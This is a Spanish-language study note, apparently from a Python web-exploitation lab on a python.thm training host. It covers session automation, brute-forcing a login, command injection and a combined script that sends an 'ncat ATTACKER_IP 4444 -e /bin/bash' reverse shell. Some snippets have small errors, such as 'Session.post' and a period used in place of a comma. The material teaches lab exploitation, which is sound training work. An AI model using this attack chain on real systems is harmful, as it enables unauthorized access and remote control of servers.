---
layout: apunte
title: "5. Task Automation"
---

<h2>Automatizando el Manejo de Sesión</h2>
Cuando automatizamos ataques contra aplicaciones web, manejar la persistencia de la sesión es crucial. Muchas aplicaciones web recaen en la autentificación basada en la sesión, donde una cookie de sesión es asignada después del login y debe ser mandada con cada petición. En lugar de manejar las cookies de sesión manualmente, la clase de Python `requests.Session()` automatiza este proceso, permitiéndole al exploit:

- Evitar pasos manuales de login cuando se comprueba un objetivo.
- Mantener persistencia incluso si la sesión expira.
- Ayuda a desarrolladores a reproducir el exploit automatizando interacciones complejas.

<h3>Mantener la Sesión</h3>
En lugar de mandar las credenciales con cada petición, podemos iniciar sesión una vez y guardar dicha sesión y usarla para interacciones futuras.

```python
import requests

session = requests.Session()

login_url = "http://python.thm/labs/lab4/login.php"

credentials = {"username": "admin", "password": "password123"}

response = Session.post(login_url, data=credentials)

if "Welcome" in response.text:
	print("[+] Login successful. Session cookies are stored automatically!")
else:
	print("[-] Login failed.")
```

Después de iniciar sesión, el objeto `session` recuerda las cookies de autentificación, permitiéndonos mandar peticiones autentificadas sin manejar cookies manualmente.

--------------------------------------
<h2>Automatización del Login a la Ejecución de Comandos</h2>
Un exploit bien automatizado debería manejar:

1. Bypasseo de autentificación vía fuerza bruta.
2. Mantener acceso automatizando la gestión de cookies.
3. Escalar privilegios usando RCE para ganar una reverse shell.

Como `login.php` no tiene protección contra fuerza bruta, podemos automatizar la adivinación de credenciales.

```python
def brute_force_login():
	"""Brute forces the login panel."""
	session = requests.Session()
	
	wordlist = ["password", "admin123", "letmein", "qwerty", "12345"]
	
	for password in wordlist:
		print(f"[*] Trying password: {password}")
		data = {"username": USERNAME, "password": password}
		response = session.post(LOGIN_URL, data=data)
		
		if "Welcome" in response.text:
			print(f"[+] Login successful! USername: {USERNAME}, Password: {password}")
			return session
	
	print("[-] Brute force failed.")
	return None
```

Una vez con la sesión iniciada, manipulamos el menú para inyectar comandos arbitrarios:

```python
def command_injection(session, command):
	"""Exploits command injection by sending a modified drop-down value."""
	response = session.post(EXECUTE_URL, data={"cmd": command})
	
	if response.status_code == 200:
		print(f"[+] Command Output:\n{response.text}")
	else:
		print("[-] Exploit failed.")

if session:
	command_injection(session. "id")
	command_injection(session, "whoami")
```

Ahora que podemos ejecutar comandos arbitrarios, usamos esto para spawnear una shell.

```python
def get_reverse_shell(session, attacker_ip="ATTACKER_IP", attacker_port=4444):
	"""Sends a reverse shell payload."""
	payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
	
	print("[+] Sending a reverse shell payload...")
	session.post(EXECUTE_URL, data={"cmd": payload})

if session:
	get_reverse_shell(session, "ATTACKER_IP", 4444)
```

El siguiente script combina la automatización de sesión, inyección de comandos y escalada de privilegios:

```python
import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD = "password123"

def authenticate():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    return None

def execute_command(session, command):
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, attacker_ip, attacker_port):
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    execute_command(session, payload)

session = authenticate()
if session:
    execute_command(session, "whoami")
    get_reverse_shell(session, "ATTACKER_IP", 4444)
```